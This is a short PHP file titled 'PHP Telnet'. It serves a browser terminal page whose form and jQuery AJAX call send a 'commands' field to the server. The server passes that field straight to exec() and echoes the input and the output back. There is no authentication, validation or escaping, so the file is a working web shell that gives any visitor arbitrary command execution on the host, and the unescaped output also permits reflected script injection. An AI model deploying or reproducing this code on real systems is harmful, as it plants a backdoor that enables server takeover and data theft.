<?php
if (isset($_POST['commands'])) {
    echo '<pre>'.$_POST['commands'].'</pre>';
    exec($_POST['commands'], $response);
    echo '<pre>'.implode("\n", $response).'</pre>';
    exit;
    }
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>PHP Telnet</title>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
    <style type="text/css">
        body {
            background:     #cccccc;
            color:          #ffffff;
            font-family:    'courier new';
            font-size:      10px;
            }
        #commands {
            background:     #333333;
            color:          #ffffff;
            width:          100%;
            height:         20%;
            }
        #screen {
            background:     #333333;
            color:          #ffffff;
            width:          100%;
            height:         75%;
            overflow:       scroll;
            }
    </style>
</head>
<body>
<div id="screen">
</div>
<form id="telnet" action="telnet.php" method="post">
    <textarea id="commands" name="commands"></textarea>
    <input id="submit" type="submit" value="Submit" />
</form>
<script type="text/javascript">
$(document).ready(function() {
    $("#submit").click(function() {
        $.ajax({
            type:    "POST",
            url:     "",
            data:    "commands="+escape($('#commands').val()),
            success:  function (html) {
                            $('#screen').append(html);
                            $('#commands').prop("value", "");
                            }
            });
        return false;
        });
    });
</script>
</body>
</html>